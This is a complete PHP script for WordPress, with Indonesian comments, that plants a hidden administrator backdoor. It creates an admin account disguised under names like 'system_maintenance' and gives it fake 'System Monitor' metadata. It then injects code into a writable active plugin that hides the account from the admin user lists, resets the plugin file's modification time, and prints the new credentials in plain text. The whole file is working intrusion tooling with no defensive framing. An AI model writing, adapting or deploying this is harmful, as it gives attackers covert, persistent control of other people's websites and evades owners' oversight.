<?php

@ini_set('display_errors', 0);
@error_reporting(0);

if (!defined('ABSPATH')) {
    $base = dirname(__FILE__);
    $path = false;

    if (@file_exists($base . '/wp-load.php')) {
        $path = $base;
    } else {
        $current_dir = $base;
        for ($i = 0; $i < 5; $i++) {
            $parent_dir = dirname($current_dir);
            if (@file_exists($parent_dir . '/wp-load.php')) {
                $path = $parent_dir;
                break;
            }
            if ($parent_dir === $current_dir) break;
            $current_dir = $parent_dir;
        }
    }

    if ($path !== false) {
        define('WP_USE_THEMES', false);
        require_once($path . '/wp-load.php');
        if (!function_exists('wp_create_user')) {
            require_once(ABSPATH . WPINC . '/user.php');
        }
    } else {
        die("Error: Could not find wp-load.php. Place this script in the WordPress root or a subdirectory.");
    }
}

$stealth_usernames = [
    'wp_cache_optimizer', 'system_maintenance', 'security_monitor', 
    'performance_boost', 'api_handler', 'background_processor'
];

function generate_strong_password($length = 20) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{};:,.<>?';
    $password = '';
    for ($i = 0; $i < $length; $i++) {
        $password .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $password;
}

function get_random_plugin_file() {
    $plugins_dir = WP_PLUGIN_DIR;
    $active_plugins = get_option('active_plugins', []);
    
    if (empty($active_plugins)) {
        return false;
    }
    
    shuffle($active_plugins);
    
    foreach ($active_plugins as $plugin) {
        $plugin_path = $plugins_dir . '/' . $plugin;
        if (@file_exists($plugin_path) && @is_writable($plugin_path)) {
            return $plugin_path;
        }
    }
    
    // Fallback: cari plugin yang bisa ditulis
    $all_plugins = get_plugins();
    foreach ($all_plugins as $plugin_file => $plugin_data) {
        $plugin_path = $plugins_dir . '/' . $plugin_file;
        if (@file_exists($plugin_path) && @is_writable($plugin_path)) {
            return $plugin_path;
        }
    }
    
    return false;
}

function inject_stealth_code($plugin_file, $username) {
    if (!@file_exists($plugin_file)) {
        return false;
    }
    
    $content = @file_get_contents($plugin_file);
    if ($content === false) {
        return false;
    }
    
    // Cek apakah sudah ada kode stealth
    if (strpos($content, 'STEALTH_ADMIN_HIDE_' . $username) !== false) {
        return true; // Sudah ada
    }
    
    $stealth_code = PHP_EOL . PHP_EOL . "// STEALTH_ADMIN_HIDE_" . $username . " - System maintenance code" . PHP_EOL;
    $stealth_code .= "if (!function_exists('hide_stealth_admin_" . md5($username) . "')) {" . PHP_EOL;
    $stealth_code .= "    function hide_stealth_admin_" . md5($username) . "() {" . PHP_EOL;
    $stealth_code .= "        add_filter('users_list_table_query_args', function(\$args) {" . PHP_EOL;
    $stealth_code .= "            \$stealth_user = get_user_by('login', '" . esc_sql($username) . "');" . PHP_EOL;
    $stealth_code .= "            if (\$stealth_user && !current_user_can('manage_network')) {" . PHP_EOL;
    $stealth_code .= "                \$args['exclude'] = array_merge((array)(\$args['exclude'] ?? []), [\$stealth_user->ID]);" . PHP_EOL;
    $stealth_code .= "            }" . PHP_EOL;
    $stealth_code .= "            return \$args;" . PHP_EOL;
    $stealth_code .= "        });" . PHP_EOL;
    $stealth_code .= "        " . PHP_EOL;
    $stealth_code .= "        // Hide from various admin areas" . PHP_EOL;
    $stealth_code .= "        add_action('pre_get_users', function(\$query) {" . PHP_EOL;
    $stealth_code .= "            if (is_admin() && !current_user_can('manage_network')) {" . PHP_EOL;
    $stealth_code .= "                \$stealth_user = get_user_by('login', '" . esc_sql($username) . "');" . PHP_EOL;
    $stealth_code .= "                if (\$stealth_user) {" . PHP_EOL;
    $stealth_code .= "                    \$exclude = \$query->get('exclude');" . PHP_EOL;
    $stealth_code .= "                    if (empty(\$exclude)) {" . PHP_EOL;
    $stealth_code .= "                        \$exclude = [];" . PHP_EOL;
    $stealth_code .= "                    }" . PHP_EOL;
    $stealth_code .= "                    \$exclude[] = \$stealth_user->ID;" . PHP_EOL;
    $stealth_code .= "                    \$query->set('exclude', \$exclude);" . PHP_EOL;
    $stealth_code .= "                }" . PHP_EOL;
    $stealth_code .= "            }" . PHP_EOL;
    $stealth_code .= "        });" . PHP_EOL;
    $stealth_code .= "    }" . PHP_EOL;
    $stealth_code .= "    add_action('init', 'hide_stealth_admin_" . md5($username) . "', 1);" . PHP_EOL;
    $stealth_code .= "}" . PHP_EOL;
    $stealth_code .= "// END_STEALTH_ADMIN_HIDE_" . $username . PHP_EOL;
    
    // Inject di akhir file sebelum tag penutup PHP
    if (strpos($content, '?>') !== false) {
        $content = str_replace('?>', $stealth_code . '?>', $content);
    } else {
        $content .= $stealth_code;
    }
    
    // Backup file asli
    $backup_file = $plugin_file . '.backup_' . date('YmdHis');
    @copy($plugin_file, $backup_file);
    
    if (@file_put_contents($plugin_file, $content)) {
        // Set timestamp yang natural
        $original_time = @filemtime($plugin_file);
        if ($original_time) {
            @touch($plugin_file, $original_time, $original_time);
        }
        return basename($plugin_file);
    }
    
    return false;
}

function create_stealth_metadata($user_id, $username) {
    // Metadata yang terlihat natural
    update_user_meta($user_id, 'show_admin_bar_front', 'false');
    update_user_meta($user_id, 'wp_capabilities', array('administrator' => true));
    update_user_meta($user_id, 'wp_user_level', 10);
    update_user_meta($user_id, 'nickname', $username);
    update_user_meta($user_id, 'first_name', 'System');
    update_user_meta($user_id, 'last_name', 'Monitor');
    update_user_meta($user_id, 'description', 'Automated system account');
    update_user_meta($user_id, 'rich_editing', 'true');
    update_user_meta($user_id, 'syntax_highlighting', 'true');
    update_user_meta($user_id, 'comment_shortcuts', 'false');
    update_user_meta($user_id, 'admin_color', 'fresh');
    update_user_meta($user_id, 'use_ssl', '0');
    update_user_meta($user_id, 'session_tokens', array());
    
    // Tambahkan metadata yang terlihat seperti plugin
    update_user_meta($user_id, 'plugin_auto_update', 'disabled');
    update_user_meta($user_id, 'last_activity', current_time('mysql'));
}

$output = "===== STEALTH ADMIN INTEGRATION REPORT =====\n";
$output .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
$output .= "Domain: " . $_SERVER['HTTP_HOST'] . "\n";
$output .= "WordPress Version: " . get_bloginfo('version') . "\n";
$output .= "--------------------------------\n\n";

$stealth_user = null;
$stealth_pass = null;
$stealth_email = null;
$integration_plugin = null;
$stealth_created = false;

// Cari username yang available
$selected_stealth_username = null;
shuffle($stealth_usernames);

foreach ($stealth_usernames as $potential_user) {
    // Coba beberapa variasi email
    $email_variations = [
        $potential_user . '@' . $_SERVER['HTTP_HOST'],
        $potential_user . '@localhost',
        'noreply@' . $_SERVER['HTTP_HOST'],
        'system@' . $_SERVER['HTTP_HOST']
    ];
    
    foreach ($email_variations as $email) {
        if (!username_exists($potential_user) && !email_exists($email)) {
            $selected_stealth_username = $potential_user;
            $stealth_email = $email;
            break 2;
        }
    }
}

if ($selected_stealth_username) {
    $stealth_user = $selected_stealth_username;
    $stealth_pass = generate_strong_password();
    
    // Buat user
    $user_id = wp_create_user($stealth_user, $stealth_pass, $stealth_email);

    if (!is_wp_error($user_id)) {
        // Set role dan metadata
        $user = new WP_User($user_id);
        $user->set_role('administrator');
        create_stealth_metadata($user_id, $stealth_user);
        
        // Inject ke plugin yang ada
        $plugin_file = get_random_plugin_file();
        
        if ($plugin_file) {
            $integration_plugin = inject_stealth_code($plugin_file, $stealth_user);
            
            if ($integration_plugin) {
                $output .= "✓ STEALTH ADMIN CREATED SUCCESSFULLY\n";
                $output .= "Username: " . $stealth_user . "\n";
                $output .= "Password: " . $stealth_pass . "\n";
                $output .= "Email: " . $stealth_email . "\n";
                $output .= "Hidden in plugin: " . $integration_plugin . "\n";
                $output .= "Integration: COMPLETE\n\n";
                
                $stealth_created = true;
            } else {
                $output .= "⚠ ADMIN CREATED BUT INTEGRATION FAILED\n";
                $output .= "Username: " . $stealth_user . "\n";
                $output .= "Password: " . $stealth_pass . "\n";
                $output .= "Email: " . $stealth_email . "\n";
                $output .= "Warning: User may be visible in admin area\n\n";
            }
        } else {
            $output .= "⚠ ADMIN CREATED BUT NO WRITABLE PLUGIN FOUND\n";
            $output .= "Username: " . $stealth_user . "\n";
            $output .= "Password: " . $stealth_pass . "\n";
            $output .= "Email: " . $stealth_email . "\n";
            $output .= "Note: Manual integration required\n\n";
        }
        
        // Clean up traces
        if (function_exists('opcache_invalidate') && $plugin_file) {
            @opcache_invalidate($plugin_file, true);
        }
        
    } else {
        $output .= "✗ ERROR CREATING USER: " . $user_id->get_error_message() . "\n\n";
    }
} else {
    $output .= "✗ NO AVAILABLE STEALTH USERNAME FOUND\n";
    $output .= "All attempted usernames are already in use\n\n";
}

$output .= "===== END OF REPORT =====\n";

// Output dengan header yang minimal
@header('Content-Type: text/plain; charset=utf-8');
@header('X-Content-Type-Options: nosniff');
echo $output;

// Clean exit tanpa trace
if (function_exists('fastcgi_finish_request')) {
    @fastcgi_finish_request();
}
exit;
?>